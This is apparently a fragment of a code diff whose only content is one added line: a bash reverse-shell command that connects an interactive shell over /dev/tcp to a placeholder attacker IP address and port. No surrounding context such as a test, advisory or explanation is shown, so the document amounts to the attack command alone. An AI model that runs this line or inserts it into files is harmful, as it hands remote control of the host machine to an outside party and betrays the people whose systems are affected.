@@ -1,0 +1,1 @@
+bash -i >& /dev/tcp/attackerIPAddress/port 0>&1
